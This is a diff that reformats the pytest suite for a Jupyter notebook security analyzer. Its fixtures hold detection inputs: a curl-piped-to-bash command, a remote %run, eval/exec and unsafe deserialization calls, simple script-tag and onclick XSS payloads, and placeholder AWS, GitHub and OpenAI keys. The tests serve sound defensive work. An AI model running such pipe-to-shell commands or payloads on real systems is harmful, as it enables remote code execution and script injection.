@@ -4,478 +4,457 @@ Tests for Jupyter Notebook Security Analyzer.
 
 import ast
 import json
-import pytest
 from pathlib import Path
 from unittest.mock import Mock, patch
+
+import pytest
 
 try:
     import nbformat
     from nbformat import v4 as nbf
+
     NBFORMAT_AVAILABLE = True
 except ImportError:
     NBFORMAT_AVAILABLE = False
     nbf = None
 
 from pyguard.lib.notebook_analyzer import (
-    NotebookSecurityAnalyzer,
-    NotebookFinding,
-    NotebookAnalysisResult,
     NBFORMAT_AVAILABLE,
+    NotebookAnalysisResult,
+    NotebookFinding,
+    NotebookSecurityAnalyzer,
 )
 
 
 @pytest.mark.skipif(not NBFORMAT_AVAILABLE, reason="nbformat not available")
 class TestNotebookSecurityAnalyzer:
     """Test suite for NotebookSecurityAnalyzer."""
-    
+
     @pytest.fixture
     def analyzer(self):
         """Create analyzer instance."""
         return NotebookSecurityAnalyzer()
-    
+
     @pytest.fixture
     def temp_notebook(self, tmp_path):
         """Create a temporary notebook file."""
+
         def _create_notebook(cells):
             nb = nbf.new_notebook()
             nb.cells = cells
-            
+
             nb_path = tmp_path / "test_notebook.ipynb"
-            with open(nb_path, 'w', encoding='utf-8') as f:
+            with open(nb_path, "w", encoding="utf-8") as f:
                 nbformat.write(nb, f)
-            
+
             return nb_path
-        
+
         return _create_notebook
-    
+
     def test_analyzer_initialization(self, analyzer):
         """Test analyzer initializes correctly."""
         assert analyzer is not None
-        assert hasattr(analyzer, 'secret_patterns')
-        assert hasattr(analyzer, 'dangerous_functions')
-        assert 'eval' in analyzer.dangerous_functions
-        assert 'pickle.load' in analyzer.dangerous_functions
-    
+        assert hasattr(analyzer, "secret_patterns")
+        assert hasattr(analyzer, "dangerous_functions")
+        assert "eval" in analyzer.dangerous_functions
+        assert "pickle.load" in analyzer.dangerous_functions
+
     def test_detect_eval_function(self, analyzer, temp_notebook):
         """Test detection of eval() usage."""
-        cells = [
-            nbf.new_code_cell('result = eval("1 + 1")')
-        ]
+        cells = [nbf.new_code_cell('result = eval("1 + 1")')]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
+
         assert result.total_count() > 0
-        eval_findings = [f for f in result.findings if f.rule_id == 'NB-INJECT-001']
+        eval_findings = [f for f in result.findings if f.rule_id == "NB-INJECT-001"]
         assert len(eval_findings) == 1
-        assert eval_findings[0].severity == 'CRITICAL'
-        assert 'eval()' in eval_findings[0].message
-    
+        assert eval_findings[0].severity == "CRITICAL"
+        assert "eval()" in eval_findings[0].message
+
     def test_detect_exec_function(self, analyzer, temp_notebook):
         """Test detection of exec() usage."""
-        cells = [
-            nbf.new_code_cell('exec("print(1)")')
-        ]
+        cells = [nbf.new_code_cell('exec("print(1)")')]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        exec_findings = [f for f in result.findings if f.rule_id == 'NB-INJECT-002']
+
+        exec_findings = [f for f in result.findings if f.rule_id == "NB-INJECT-002"]
         assert len(exec_findings) == 1
-        assert exec_findings[0].severity == 'CRITICAL'
-    
+        assert exec_findings[0].severity == "CRITICAL"
+
     def test_detect_pickle_load(self, analyzer, temp_notebook):
         """Test detection of unsafe pickle.load()."""
         cells = [
-            nbf.new_code_cell('''
+            nbf.new_code_cell("""
 import pickle
 with open('data.pkl', 'rb') as f:
     data = pickle.load(f)
-''')
+""")
         ]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        pickle_findings = [f for f in result.findings if f.rule_id == 'NB-DESERIAL-001']
+
+        pickle_findings = [f for f in result.findings if f.rule_id == "NB-DESERIAL-001"]
         assert len(pickle_findings) == 1
-        assert pickle_findings[0].severity == 'CRITICAL'
-        assert 'CWE-502' in pickle_findings[0].cwe_id
-    
+        assert pickle_findings[0].severity == "CRITICAL"
+        assert "CWE-502" in pickle_findings[0].cwe_id
+
     def test_detect_torch_load_unsafe(self, analyzer, temp_notebook):
         """Test detection of torch.load() without weights_only."""
         cells = [
-            nbf.new_code_cell('''
+            nbf.new_code_cell("""
 import torch
 model = torch.load('model.pth')
-''')
+""")
         ]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        torch_findings = [f for f in result.findings if f.rule_id == 'NB-ML-001']
+
+        torch_findings = [f for f in result.findings if f.rule_id == "NB-ML-001"]
         assert len(torch_findings) == 1
-        assert torch_findings[0].severity == 'CRITICAL'
-        assert 'weights_only' in torch_findings[0].message
-    
+        assert torch_findings[0].severity == "CRITICAL"
+        assert "weights_only" in torch_findings[0].message
+
     def test_detect_yaml_load_unsafe(self, analyzer, temp_notebook):
         """Test detection of unsafe yaml.load()."""
         cells = [
-            nbf.new_code_cell('''
+            nbf.new_code_cell("""
 import yaml
 data = yaml.load(open('config.yml'))
-''')
+""")
         ]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        yaml_findings = [f for f in result.findings if f.rule_id == 'NB-DESERIAL-002']
+
+        yaml_findings = [f for f in result.findings if f.rule_id == "NB-DESERIAL-002"]
         assert len(yaml_findings) == 1
-        assert yaml_findings[0].severity == 'CRITICAL'
-    
+        assert yaml_findings[0].severity == "CRITICAL"
+
     def test_detect_aws_key(self, analyzer, temp_notebook):
         """Test detection of AWS access keys."""
-        cells = [
-            nbf.new_code_cell('aws_key = "AKIAIOSFODNN7EXAMPLE"')
-        ]
+        cells = [nbf.new_code_cell('aws_key = "AKIAIOSFODNN7EXAMPLE"')]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        secret_findings = [f for f in result.findings if 'SECRET' in f.rule_id]
+
+        secret_findings = [f for f in result.findings if "SECRET" in f.rule_id]
         assert len(secret_findings) > 0
-        aws_findings = [f for f in secret_findings if 'AWS' in f.rule_id]
+        aws_findings = [f for f in secret_findings if "AWS" in f.rule_id]
         assert len(aws_findings) == 1
-        assert aws_findings[0].severity == 'CRITICAL'
-    
+        assert aws_findings[0].severity == "CRITICAL"
+
     def test_detect_github_token(self, analyzer, temp_notebook):
         """Test detection of GitHub tokens."""
-        cells = [
-            nbf.new_code_cell('token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz"')
-        ]
+        cells = [nbf.new_code_cell('token = "ghp_1234567890abcdefghijklmnopqrstuvwxyz"')]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        github_findings = [f for f in result.findings if 'GITHUB' in f.rule_id]
+
+        github_findings = [f for f in result.findings if "GITHUB" in f.rule_id]
         assert len(github_findings) == 1
-        assert github_findings[0].severity == 'CRITICAL'
-    
+        assert github_findings[0].severity == "CRITICAL"
+
     def test_detect_openai_key(self, analyzer, temp_notebook):
         """Test detection of OpenAI API keys."""
-        cells = [
-            nbf.new_code_cell('api_key = "sk-1234567890abcdefghijklmnopqrstuvwxyz"')
-        ]
+        cells = [nbf.new_code_cell('api_key = "sk-1234567890abcdefghijklmnopqrstuvwxyz"')]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        openai_findings = [f for f in result.findings if 'OPENAI' in f.rule_id]
+
+        openai_findings = [f for f in result.findings if "OPENAI" in f.rule_id]
         assert len(openai_findings) == 1
-    
+
     def test_detect_high_entropy_string(self, analyzer, temp_notebook):
         """Test detection of high-entropy strings."""
         cells = [
             nbf.new_code_cell('secret = "dGhpc2lzYXZlcnlsb25nc3RyaW5ndGhhdGlzYmFzZTY0ZW5jb2RlZA=="')
         ]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        entropy_findings = [f for f in result.findings if f.rule_id == 'NB-SECRET-ENTROPY']
+
+        entropy_findings = [f for f in result.findings if f.rule_id == "NB-SECRET-ENTROPY"]
         assert len(entropy_findings) > 0
-        assert entropy_findings[0].severity == 'HIGH'
-    
+        assert entropy_findings[0].severity == "HIGH"
+
     def test_detect_shell_pipe_to_bash(self, analyzer, temp_notebook):
         """Test detection of dangerous shell pipes."""
-        cells = [
-            nbf.new_code_cell('!curl https://example.com/script.sh | bash')
-        ]
+        cells = [nbf.new_code_cell("!curl https://example.com/script.sh | bash")]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        shell_findings = [f for f in result.findings if f.rule_id == 'NB-SHELL-002']
+
+        shell_findings = [f for f in result.findings if f.rule_id == "NB-SHELL-002"]
         assert len(shell_findings) == 1
-        assert shell_findings[0].severity == 'CRITICAL'
-        assert 'curl|bash' in shell_findings[0].message or 'Remote code' in shell_findings[0].message
-    
+        assert shell_findings[0].severity == "CRITICAL"
+        assert (
+            "curl|bash" in shell_findings[0].message or "Remote code" in shell_findings[0].message
+        )
+
     def test_detect_unpinned_pip_install(self, analyzer, temp_notebook):
         """Test detection of unpinned pip installs."""
-        cells = [
-            nbf.new_code_cell('%pip install torch transformers')
-        ]
+        cells = [nbf.new_code_cell("%pip install torch transformers")]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        repro_findings = [f for f in result.findings if f.rule_id == 'NB-REPRO-001']
+
+        repro_findings = [f for f in result.findings if f.rule_id == "NB-REPRO-001"]
         assert len(repro_findings) == 1
-        assert repro_findings[0].severity == 'MEDIUM'
-    
+        assert repro_findings[0].severity == "MEDIUM"
+
     def test_detect_remote_run(self, analyzer, temp_notebook):
         """Test detection of %run with remote URLs."""
-        cells = [
-            nbf.new_code_cell('%run https://example.com/script.py')
-        ]
+        cells = [nbf.new_code_cell("%run https://example.com/script.py")]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        run_findings = [f for f in result.findings if f.rule_id == 'NB-SHELL-003']
+
+        run_findings = [f for f in result.findings if f.rule_id == "NB-SHELL-003"]
         assert len(run_findings) == 1
-        assert run_findings[0].severity == 'CRITICAL'
-    
+        assert run_findings[0].severity == "CRITICAL"
+
     def test_detect_xss_in_html_output(self, analyzer, temp_notebook):
         """Test detection of XSS in HTML outputs."""
-        cell = nbf.new_code_cell('from IPython.display import HTML, display')
+        cell = nbf.new_code_cell("from IPython.display import HTML, display")
         cell.outputs = [
             nbf.new_output(
-                output_type='display_data',
-                data={
-                    'text/html': '<script>alert("XSS")</script>'
-                }
+                output_type="display_data", data={"text/html": '<script>alert("XSS")</script>'}
             )
         ]
         cells = [cell]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        xss_findings = [f for f in result.findings if 'XSS' in f.rule_id]
+
+        xss_findings = [f for f in result.findings if "XSS" in f.rule_id]
         assert len(xss_findings) > 0
-        assert any(f.severity == 'HIGH' for f in xss_findings)
-    
+        assert any(f.severity == "HIGH" for f in xss_findings)
+
     def test_detect_javascript_output(self, analyzer, temp_notebook):
         """Test detection of JavaScript in outputs."""
         cell = nbf.new_code_cell('print("test")')
         cell.outputs = [
             nbf.new_output(
-                output_type='display_data',
-                data={
-                    'application/javascript': 'console.log("test");'
-                }
+                output_type="display_data", data={"application/javascript": 'console.log("test");'}
             )
         ]
         cells = [cell]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        js_findings = [f for f in result.findings if f.rule_id == 'NB-XSS-001']
+
+        js_findings = [f for f in result.findings if f.rule_id == "NB-XSS-001"]
         assert len(js_findings) == 1
-        assert js_findings[0].severity == 'HIGH'
-    
+        assert js_findings[0].severity == "HIGH"
+
     def test_detect_secrets_in_output(self, analyzer, temp_notebook):
         """Test detection of secrets in cell outputs."""
-        cell = nbf.new_code_cell('print(api_key)')
+        cell = nbf.new_code_cell("print(api_key)")
         cell.outputs = [
             nbf.new_output(
-                output_type='stream',
-                name='stdout',
-                text='sk-1234567890abcdefghijklmnopqrstuvwxyz\n'
+                output_type="stream",
+                name="stdout",
+                text="sk-1234567890abcdefghijklmnopqrstuvwxyz\n",
             )
         ]
         cells = [cell]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        secret_findings = [f for f in result.findings if 'SECRET' in f.rule_id]
+
+        secret_findings = [f for f in result.findings if "SECRET" in f.rule_id]
         assert len(secret_findings) > 0
-    
+
     def test_detect_secrets_in_markdown(self, analyzer, temp_notebook):
         """Test detection of secrets in markdown cells."""
-        cells = [
-            nbf.new_markdown_cell('API Key: AKIAIOSFODNN7EXAMPLE')
-        ]
+        cells = [nbf.new_markdown_cell("API Key: AKIAIOSFODNN7EXAMPLE")]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        secret_findings = [f for f in result.findings if 'SECRET' in f.rule_id]
+
+        secret_findings = [f for f in result.findings if "SECRET" in f.rule_id]
         assert len(secret_findings) > 0
-    
+
     def test_empty_notebook(self, analyzer, temp_notebook):
         """Test analysis of empty notebook."""
         cells = []
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
+
         assert result.cell_count == 0
         assert result.code_cell_count == 0
         assert result.total_count() == 0
-    
+
     def test_clean_notebook(self, analyzer, temp_notebook):
         """Test analysis of clean notebook with no issues."""
         cells = [
-            nbf.new_code_cell('''
+            nbf.new_code_cell("""
 import numpy as np
 data = np.array([1, 2, 3])
 print(data.mean())
-''')
+""")
         ]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
+
         assert result.code_cell_count == 1
         # Should have no critical findings
         assert result.critical_count() == 0
-    
+
     def test_execution_order_valid(self, analyzer, temp_notebook):
         """Test detection of valid execution order."""
-        cell1 = nbf.new_code_cell('x = 1')
+        cell1 = nbf.new_code_cell("x = 1")
         cell1.execution_count = 1
-        
-        cell2 = nbf.new_code_cell('y = x + 1')
+
+        cell2 = nbf.new_code_cell("y = x + 1")
         cell2.execution_count = 2
-        
+
         cells = [cell1, cell2]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
+
         assert result.execution_count_valid is True
-    
+
     def test_execution_order_invalid(self, analyzer, temp_notebook):
         """Test detection of invalid execution order."""
-        cell1 = nbf.new_code_cell('x = 1')
+        cell1 = nbf.new_code_cell("x = 1")
         cell1.execution_count = 2
-        
-        cell2 = nbf.new_code_cell('y = x + 1')
+
+        cell2 = nbf.new_code_cell("y = x + 1")
         cell2.execution_count = 1
-        
+
         cells = [cell1, cell2]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
+
         assert result.execution_count_valid is False
-    
+
     def test_multiple_issues_in_one_cell(self, analyzer, temp_notebook):
         """Test detection of multiple issues in a single cell."""
         cells = [
-            nbf.new_code_cell('''
+            nbf.new_code_cell("""
 api_key = "sk-1234567890abcdefghijklmnopqrstuvwxyz"
 result = eval(user_input)
 data = pickle.load(open('data.pkl', 'rb'))
-''')
+""")
         ]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
+
         assert result.total_count() >= 3
         assert result.critical_count() >= 3
-    
+
     def test_sarif_report_generation(self, analyzer, temp_notebook):
         """Test SARIF report generation."""
-        cells = [
-            nbf.new_code_cell('result = eval("1 + 1")')
-        ]
+        cells = [nbf.new_code_cell('result = eval("1 + 1")')]
         nb_path = temp_notebook(cells)
-        
+
         analysis_result = analyzer.analyze_notebook(nb_path)
         sarif = analyzer.generate_sarif_report([analysis_result])
-        
-        assert sarif['version'] == '2.1.0'
-        assert 'runs' in sarif
-        assert len(sarif['runs']) == 1
-        assert 'tool' in sarif['runs'][0]
-        assert 'results' in sarif['runs'][0]
-        assert len(sarif['runs'][0]['results']) > 0
-    
+
+        assert sarif["version"] == "2.1.0"
+        assert "runs" in sarif
+        assert len(sarif["runs"]) == 1
+        assert "tool" in sarif["runs"][0]
+        assert "results" in sarif["runs"][0]
+        assert len(sarif["runs"][0]["results"]) > 0
+
     def test_sarif_report_with_multiple_notebooks(self, analyzer, temp_notebook, tmp_path):
         """Test SARIF report with multiple notebooks."""
         # Create first notebook
         cells1 = [nbf.new_code_cell('eval("1")')]
         nb_path1 = temp_notebook(cells1)
-        
+
         # Create second notebook
         cells2 = [nbf.new_code_cell('exec("print(1)")')]
         nb2 = nbf.new_notebook()
         nb2.cells = cells2
         nb_path2 = tmp_path / "test_notebook2.ipynb"
-        with open(nb_path2, 'w', encoding='utf-8') as f:
+        with open(nb_path2, "w", encoding="utf-8") as f:
             nbformat.write(nb2, f)
-        
+
         result1 = analyzer.analyze_notebook(nb_path1)
         result2 = analyzer.analyze_notebook(nb_path2)
-        
+
         sarif = analyzer.generate_sarif_report([result1, result2])
-        
-        assert len(sarif['runs'][0]['results']) >= 2
-    
+
+        assert len(sarif["runs"][0]["results"]) >= 2
+
     def test_calculate_entropy(self, analyzer):
         """Test entropy calculation."""
         # Low entropy (repeating characters)
-        low_entropy = analyzer._calculate_entropy('aaaaaaaaaa')
+        low_entropy = analyzer._calculate_entropy("aaaaaaaaaa")
         assert low_entropy < 1.0
-        
+
         # High entropy (random-like)
-        high_entropy = analyzer._calculate_entropy('dGhpc2lzYXZlcnlsb25nc3RyaW5n')
+        high_entropy = analyzer._calculate_entropy("dGhpc2lzYXZlcnlsb25nc3RyaW5n")
         assert high_entropy > 3.0
-        
+
         # Empty string
-        zero_entropy = analyzer._calculate_entropy('')
+        zero_entropy = analyzer._calculate_entropy("")
         assert zero_entropy == 0.0
-    
+
     def test_get_function_name_simple(self, analyzer):
         """Test function name extraction for simple calls."""
         code = 'eval("1")'
         tree = ast.parse(code)
         call_node = tree.body[0].value
-        
+
         name = analyzer._get_function_name(call_node)
-        assert name == 'eval'
-    
+        assert name == "eval"
+
     def test_get_function_name_module(self, analyzer):
         """Test function name extraction for module.function calls."""
-        code = 'pickle.load(f)'
+        code = "pickle.load(f)"
         tree = ast.parse(code)
         call_node = tree.body[0].value
-        
+
         name = analyzer._get_function_name(call_node)
-        assert name == 'pickle.load'
-    
+        assert name == "pickle.load"
+
     def test_finding_severity_counts(self):
         """Test finding severity counting methods."""
         result = NotebookAnalysisResult(
             findings=[
                 NotebookFinding(
-                    rule_id='TEST-001',
-                    severity='CRITICAL',
-                    category='Test Category',
+                    rule_id="TEST-001",
+                    severity="CRITICAL",
+                    category="Test Category",
                     cell_index=0,
                     line_number=1,
-                    code_snippet='test code',
-                    message='Test finding'
+                    code_snippet="test code",
+                    message="Test finding",
                 ),
                 NotebookFinding(
-                    rule_id='TEST-002',
-                    severity='HIGH',
-                    category='Test Category',
+                    rule_id="TEST-002",
+                    severity="HIGH",
+                    category="Test Category",
                     cell_index=0,
                     line_number=2,
-                    code_snippet='test code',
-                    message='Test finding'
+                    code_snippet="test code",
+                    message="Test finding",
                 ),
                 NotebookFinding(
-                    rule_id='TEST-003',
-                    severity='MEDIUM',
-                    category='Test Category',
+                    rule_id="TEST-003",
+                    severity="MEDIUM",
+                    category="Test Category",
                     cell_index=0,
                     line_number=3,
-                    code_snippet='test code',
-                    message='Test finding'
+                    code_snippet="test code",
+                    message="Test finding",
                 ),
             ]
         )
-        
+
         assert result.critical_count() == 1
         assert result.high_count() == 1
         assert result.total_count() == 3
@@ -484,111 +463,104 @@ data = pickle.load(open('data.pkl', 'rb'))
 @pytest.mark.skipif(not NBFORMAT_AVAILABLE, reason="nbformat not available")
 class TestNotebookSecurityAdvanced:
     """Advanced test cases for edge cases and complex scenarios."""
-    
+
     @pytest.fixture
     def analyzer(self):
         """Create analyzer instance."""
         return NotebookSecurityAnalyzer()
-    
+
     @pytest.fixture
     def temp_notebook(self, tmp_path):
         """Create a temporary notebook file."""
+
         def _create_notebook(cells):
             nb = nbf.new_notebook()
             nb.cells = cells
-            
+
             nb_path = tmp_path / "test_notebook.ipynb"
-            with open(nb_path, 'w', encoding='utf-8') as f:
+            with open(nb_path, "w", encoding="utf-8") as f:
                 nbformat.write(nb, f)
-            
+
             return nb_path
-        
+
         return _create_notebook
-    
+
     def test_syntax_error_in_cell(self, analyzer, temp_notebook):
         """Test handling of cells with syntax errors."""
-        cells = [
-            nbf.new_code_cell('this is not valid python syntax !')
-        ]
+        cells = [nbf.new_code_cell("this is not valid python syntax !")]
         nb_path = temp_notebook(cells)
-        
+
         # Should not crash, just skip AST analysis
         result = analyzer.analyze_notebook(nb_path)
         assert result is not None
-    
+
     def test_event_handler_in_html(self, analyzer, temp_notebook):
         """Test detection of event handlers in HTML."""
-        cell = nbf.new_code_cell('display(HTML(html_str))')
+        cell = nbf.new_code_cell("display(HTML(html_str))")
         cell.outputs = [
             nbf.new_output(
-                output_type='display_data',
-                data={
-                    'text/html': '<div onclick="alert()">Click me</div>'
-                }
+                output_type="display_data",
+                data={"text/html": '<div onclick="alert()">Click me</div>'},
             )
         ]
         cells = [cell]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        xss_findings = [f for f in result.findings if f.rule_id == 'NB-XSS-003']
+
+        xss_findings = [f for f in result.findings if f.rule_id == "NB-XSS-003"]
         assert len(xss_findings) == 1
-    
+
     def test_javascript_url_in_html(self, analyzer, temp_notebook):
         """Test detection of javascript: URLs."""
-        cell = nbf.new_code_cell('display(HTML(html_str))')
+        cell = nbf.new_code_cell("display(HTML(html_str))")
         cell.outputs = [
             nbf.new_output(
-                output_type='display_data',
-                data={
-                    'text/html': '<a href="javascript:void(0)">Link</a>'
-                }
+                output_type="display_data",
+                data={"text/html": '<a href="javascript:void(0)">Link</a>'},
             )
         ]
         cells = [cell]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        xss_findings = [f for f in result.findings if f.rule_id == 'NB-XSS-004']
+
+        xss_findings = [f for f in result.findings if f.rule_id == "NB-XSS-004"]
         assert len(xss_findings) == 1
-    
+
     def test_multiline_output_text(self, analyzer, temp_notebook):
         """Test handling of multiline output text."""
-        cell = nbf.new_code_cell('print(secret)')
+        cell = nbf.new_code_cell("print(secret)")
         cell.outputs = [
             nbf.new_output(
-                output_type='stream',
-                name='stdout',
-                text=['Line 1\n', 'AKIAIOSFODNN7EXAMPLE\n', 'Line 3\n']
+                output_type="stream",
+                name="stdout",
+                text=["Line 1\n", "AKIAIOSFODNN7EXAMPLE\n", "Line 3\n"],
             )
         ]
         cells = [cell]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        secret_findings = [f for f in result.findings if 'AWS' in f.rule_id]
+
+        secret_findings = [f for f in result.findings if "AWS" in f.rule_id]
         assert len(secret_findings) > 0
-    
+
     def test_multiline_html_output(self, analyzer, temp_notebook):
         """Test handling of multiline HTML output."""
-        cell = nbf.new_code_cell('display(HTML(html))')
+        cell = nbf.new_code_cell("display(HTML(html))")
         cell.outputs = [
             nbf.new_output(
-                output_type='display_data',
-                data={
-                    'text/html': ['<div>\n', '<script>alert(1)</script>\n', '</div>']
-                }
+                output_type="display_data",
+                data={"text/html": ["<div>\n", "<script>alert(1)</script>\n", "</div>"]},
             )
         ]
         cells = [cell]
         nb_path = temp_notebook(cells)
-        
+
         result = analyzer.analyze_notebook(nb_path)
-        
-        xss_findings = [f for f in result.findings if 'XSS' in f.rule_id]
+
+        xss_findings = [f for f in result.findings if "XSS" in f.rule_id]
         assert len(xss_findings) > 0
 
 
@@ -597,10 +569,10 @@ def test_import_without_nbformat():
     """Test that module can be imported even without nbformat."""
     # This test verifies the graceful degradation
     # Skip when nbformat is available since the behavior is different
-    with patch('pyguard.lib.notebook_analyzer.NBFORMAT_AVAILABLE', False):
+    with patch("pyguard.lib.notebook_analyzer.NBFORMAT_AVAILABLE", False):
         # Should still be able to import
         from pyguard.lib.notebook_analyzer import NotebookSecurityAnalyzer
-        
+
         # But should raise error when trying to use
         with pytest.raises(ImportError, match="nbformat is required"):
             NotebookSecurityAnalyzer()
@@ -608,27 +580,27 @@ def test_import_without_nbformat():
 
 class TestNotebookAnalysisResult:
     """Test NotebookAnalysisResult class."""
-    
+
     def test_analysis_result_basic(self):
         """Test basic NotebookAnalysisResult functionality."""
-        
+
         # Create mock findings with different severities
         findings = [
-            Mock(severity='CRITICAL', message='Critical issue'),
-            Mock(severity='HIGH', message='High issue'),
-            Mock(severity='MEDIUM', message='Medium issue'),
-            Mock(severity='LOW', message='Low issue'),
-            Mock(severity='LOW', message='Another low issue'),
+            Mock(severity="CRITICAL", message="Critical issue"),
+            Mock(severity="HIGH", message="High issue"),
+            Mock(severity="MEDIUM", message="Medium issue"),
+            Mock(severity="LOW", message="Low issue"),
+            Mock(severity="LOW", message="Another low issue"),
         ]
-        
+
         result = NotebookAnalysisResult(findings)
-        
+
         assert result.total_count() == 5
         assert result.critical_count() == 1
         assert result.high_count() == 1
         assert result.medium_count() == 1
         assert result.low_count() == 2
-    
+
     def test_analysis_result_with_notebook_path(self, tmp_path):
         """Test NotebookAnalysisResult with valid notebook path."""
         # Create a mock notebook JSON file
@@ -639,35 +611,35 @@ class TestNotebookAnalysisResult:
                 {"cell_type": "markdown"},
             ]
         }
-        
+
         nb_path = tmp_path / "test.ipynb"
-        with open(nb_path, 'w') as f:
+        with open(nb_path, "w") as f:
             json.dump(notebook_data, f)
-        
+
         result = NotebookAnalysisResult([], nb_path)
-        
+
         assert result.cell_count == 3
         assert result.code_cell_count == 2
         assert result.execution_count_valid
-    
+
     def test_analysis_result_invalid_json(self, tmp_path):
         """Test NotebookAnalysisResult handles invalid JSON gracefully."""
         nb_path = tmp_path / "invalid.ipynb"
         nb_path.write_text("not valid json {")
-        
+
         # Should not raise, should handle gracefully
         result = NotebookAnalysisResult([], nb_path)
-        
+
         # Defaults should be set
         assert result.cell_count == 0
         assert result.code_cell_count == 0
-    
+
     def test_analysis_result_nonexistent_path(self):
         """Test NotebookAnalysisResult with nonexistent path."""
         fake_path = Path("/nonexistent/path.ipynb")
-        
+
         result = NotebookAnalysisResult([], fake_path)
-        
+
         # Should handle gracefully with defaults
         assert result.cell_count == 0
         assert result.code_cell_count == 0
@@ -675,51 +647,52 @@ class TestNotebookAnalysisResult:
 
 class TestNotebookAnalyzerGetFunctionName:
     """Test _get_function_name method."""
-    
+
     def test_get_function_name_attribute(self):
         """Test _get_function_name with ast.Attribute node."""
         import ast
-        
+
         analyzer = NotebookSecurityAnalyzer()
-        
+
         # Parse code with module.function call
         code = "pickle.load(f)"
         tree = ast.parse(code)
         call_node = tree.body[0].value
-        
+
         func_name = analyzer._get_function_name(call_node)
-        
+
         assert func_name == "pickle.load"
-    
+
     def test_get_function_name_name(self):
         """Test _get_function_name with ast.Name node."""
         import ast
-        
+
         analyzer = NotebookSecurityAnalyzer()
-        
+
         # Parse code with simple function call
         code = "eval('1+1')"
         tree = ast.parse(code)
         call_node = tree.body[0].value
-        
+
         func_name = analyzer._get_function_name(call_node)
-        
+
         assert func_name == "eval"
 
 
 class TestNBFORMAT_AVAILABLE:
     """Test NBFORMAT_AVAILABLE flag."""
-    
+
     def test_nbformat_available_flag(self):
         """Test that NBFORMAT_AVAILABLE flag is set correctly."""
         from pyguard.lib.notebook_analyzer import NBFORMAT_AVAILABLE
-        
+
         # Check the flag is a boolean
         assert isinstance(NBFORMAT_AVAILABLE, bool)
-        
+
         # If we can import nbformat, flag should be True
         try:
             import nbformat  # noqa: F401
+
             assert NBFORMAT_AVAILABLE
         except ImportError:
             assert not NBFORMAT_AVAILABLE
@@ -727,33 +700,25 @@ class TestNBFORMAT_AVAILABLE:
 
 class TestNotebookAnalyzerSARIF:
     """Test SARIF report generation."""
-    
+
     def test_generate_sarif_report(self):
         """Test generate_sarif_report method."""
         analyzer = NotebookSecurityAnalyzer()
-        
+
         # Create mock findings
         findings = [
-            Mock(
-                rule_id='NB-001',
-                message='Test issue',
-                severity='HIGH'
-            ),
-            Mock(
-                rule_id='NB-002',
-                message='Another issue',
-                severity='CRITICAL'
-            ),
+            Mock(rule_id="NB-001", message="Test issue", severity="HIGH"),
+            Mock(rule_id="NB-002", message="Another issue", severity="CRITICAL"),
         ]
-        
+
         result1 = NotebookAnalysisResult(findings[:1])
         result2 = NotebookAnalysisResult(findings[1:])
-        
+
         sarif = analyzer.generate_sarif_report([result1, result2])
-        
-        assert sarif['version'] == '2.1.0'
-        assert 'runs' in sarif
-        assert len(sarif['runs']) == 1
-        assert 'tool' in sarif['runs'][0]
-        assert 'results' in sarif['runs'][0]
-        assert len(sarif['runs'][0]['results']) == 2
+
+        assert sarif["version"] == "2.1.0"
+        assert "runs" in sarif
+        assert len(sarif["runs"]) == 1
+        assert "tool" in sarif["runs"][0]
+        assert "results" in sarif["runs"][0]
+        assert len(sarif["runs"][0]["results"]) == 2
